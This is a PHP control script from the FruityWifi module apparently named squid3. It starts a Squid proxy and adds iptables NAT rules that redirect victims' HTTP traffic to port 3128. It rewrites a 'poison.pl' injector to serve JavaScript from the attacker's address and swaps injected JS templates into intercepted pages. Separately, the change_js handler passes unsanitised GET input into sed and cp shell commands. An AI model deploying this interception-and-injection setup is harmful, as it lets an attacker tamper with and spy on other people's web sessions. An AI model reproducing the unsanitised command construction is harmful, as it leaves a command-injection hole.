<?
include_once dirname(__FILE__)."/../../../config/config.php";
include_once dirname(__FILE__)."/../_info_.php";

require_once WWWPATH."/includes/login_check.php";
require_once WWWPATH."/includes/filter_getpost.php";
include_once WWWPATH."/includes/functions.php";

if(isset($_GET['service']) and $_GET['service'] == "squid3" and isset($_GET['action'])) {
    if ($_GET['action'] == "start") {

        // CREATE LOG FILE
        //if (!file_exists($filename)) {
        if (!file_exists($mod_logs)) {
            touch($mod_logs);
            chmod($mod_logs, 0666);
        }

        // COPY LOG
        if (file_exists($mod_logs) and 0 < filesize($mod_logs)) {
            exec_fruitywifi(BIN_CP." $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log");
            exec_fruitywifi(BIN_ECHO." -n > $mod_logs");
        }

        exec_fruitywifi("if [ ! -d '/var/www/tmp-squid' ]; then mkdir /var/www/tmp-squid; chmod 777 /var/www/tmp-squid; fi;");

        exec_fruitywifi(BIN_SED." -i 's/print \\\"http.*tmp/print \\\"http:\\/\\/$io_in_ip:80\\/tmp/g' $mod_path/includes/inject/poison.pl");
        // print "http://10.0.0.1:80/tmp/$pid-$count.js\n";

        exec_fruitywifi(BIN_SQUID3." -f $mod_path/includes/squid.conf &");
        exec_fruitywifi(BIN_IPTABLES." -t nat -A PREROUTING -i $io_action -p tcp --dport 80 -j REDIRECT --to-port 3128");

    } elseif($_GET['action'] == "stop") {

        // COPY LOG
        if (file_exists($mod_logs) and 0 < filesize($mod_logs)) {
            exec_fruitywifi(BIN_CP." $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log");
            exec_fruitywifi(BIN_ECHO." -n > $mod_logs");
        }

        // STOP MODULE
        exec_fruitywifi(BIN_KILLALL." squid3");
        exec_fruitywifi("/etc/init.d/squid3 stop");
        exec_fruitywifi(BIN_IPTABLES." -t nat -D PREROUTING -i $io_action -p tcp --dport 80 -j REDIRECT --to-port 3128");

        exec_fruitywifi("if [ -d '/var/www/tmp-squid' ]; then rm -R /var/www/tmp-squid; fi;");

    }
}

if(isset($_GET['service']) and $_GET['service'] == "url_rewrite" and isset($_GET['action'])) {
    if ($_GET['action'] == "start") {
        exec_fruitywifi(BIN_SED." -i 's/^\#url_rewrite_program/url_rewrite_program/g' $mod_path/includes/squid.conf");
        exec_fruitywifi(BIN_SQUID3." -k reconfigure");
    } elseif($_GET['action'] == "stop") {
        exec_fruitywifi(BIN_SED." -i 's/^url_rewrite_program/\#url_rewrite_program/g' $mod_path/includes/squid.conf");
        exec_fruitywifi(BIN_SQUID3." -k reconfigure");
    }
        header('Location: ../index.php');
        exit;
}

if(isset($_GET['service']) and $_GET['service'] == "iptables" and isset($_GET['action'])) {
    if ($_GET['action'] == "start") {
        exec_fruitywifi(BIN_IPTABLES." -t nat -A PREROUTING -i $io_action -p tcp --dport 80 -j REDIRECT --to-port 3128");
    } elseif($_GET['action'] == "stop") {
        exec_fruitywifi(BIN_IPTABLES." -t nat -D PREROUTING -i $io_action -p tcp --dport 80 -j REDIRECT --to-port 3128");
    }
    header('Location: ../index.php');
    exit;
}

if(isset($_GET['change_js']) and $_GET['change_js'] == "1") {
    $action = $_GET['action'];
    exec_fruitywifi(BIN_SED." -i 's/url_rewrite_program=.*/url_rewrite_program=\\\"".$action."\\\";/g' ../_info_.php");
    exec_fruitywifi(BIN_CP." $mod_path/includes/templates/$action $mod_path/includes/inject/pasarela.js");

    header('Location: ../index.php');
    exit;
}


if (isset($_GET['install']) and $_GET['install'] == "install_$mod_name") {

    if(!is_dir($mod_logs_history)) {
        exec_fruitywifi(BIN_MKDIR." -p $mod_logs_history");
        exec_fruitywifi(BIN_CHOWN." fruitywifi:fruitywifi $mod_logs_history");
    }

    exec_fruitywifi(BIN_CHMOD." 755 install.sh");
    exec_fruitywifi("./install.sh > ".LOGPATH."/install.txt &");

    header('Location: '.WEBPATH.'/modules/install.php?module='.$mod_name);
    exit;
}

if (isset($_GET['page']) and $_GET['page'] == "status") {
    header('Location: '.WEBPATH.'/action.php');
} else {
    header('Location: '.WEBPATH.'/modules/action.php?page='.$mod_name);
}

?>